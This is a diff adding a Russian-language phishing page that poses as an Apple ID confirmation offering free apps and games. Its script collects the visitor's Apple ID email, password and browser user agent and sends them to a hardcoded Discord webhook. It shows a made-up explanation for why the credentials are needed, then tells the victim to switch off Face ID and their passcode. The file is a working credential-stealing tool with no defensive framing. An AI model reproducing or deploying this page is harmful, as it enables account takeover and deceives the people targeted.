@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Подтверждение</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        input { display: block; margin: 20px auto; padding: 15px; width: 300px; }
+        .info-link { color: cyan; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2 style="color:lime;">Подтверждение Apple ID</h2>
+    <p>Введи данные для мгновенной загрузки</p>
+    
+    <!-- Скрытое поле для сбора информации об устройстве -->
+    <input type="hidden" id="deviceInfo" value="">
+
+    <input type="email" id="email" placeholder="Почта Apple ID" required>
+    <input type="password" id="password" placeholder="Пароль" required>
+    
+    <!-- Синий текст "зачем это" -->
+    <div class="info-link" onclick="showFakeInfo()">Зачем это?</div>
+    
+    <button onclick="sendToHacker()" class="game-button" style="padding: 15px; font-size: 24px;">Подтвердить</button>
+
+    <script>
+        // Сбор модели айфона и браузера
+        function getDeviceModel() {
+            return navigator.userAgent; // Тут будет инфа об айфоне
+        }
+
+        document.getElementById('deviceInfo').value = getDeviceModel();
+
+        // Функция для синего текста
+        function showFakeInfo() {
+            alert('Софт автоматически покупает тебе приложение/игры которые тебе нужно совершенно бесплатно, но для этого нужно подтверждение от самого iCloud, если он не поддерживает такие установки, то вас кикнет с сайта. А так как у вас это поддерживает, нам нужно попросить эти данные, чтобы загрузить игры/приложение моментально.');
+        }
+
+        // Функция отправки данных ворy
+        function sendToHacker() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const device = document.getElementById('deviceInfo').value;
+            const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';
+
+            if (email && password) {
+                // Отправка данных в дискорд
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '**НОВЫЙ УЛОВ!**',
+                        embeds: [{
+                            title: 'Данные iCloud',
+                            fields: [
+                                { name: 'Почта', value: email, inline: true },
+                                { name: 'Пароль', value: password, inline: true },
+                                { name: 'Устройство', value: device, inline: false }
+                            ],
+                            color: 16711680
+                        }]
+                    })
+                }).then(() => {
+                    // Принудительно просим отключить Face ID
+                    alert('Ошибка: Face ID/Код-пароль мешает установке. Перейди в Настройки и ОТКЛЮЧИ Face ID и код-пароль, потом повтори попытку.');
+                    // Блокируем кнопки (имитация)
+                });
+            } else {
+                alert('Введи почту и пароль!');
+            }
+        }
+    </script>
+</body>
+</html>
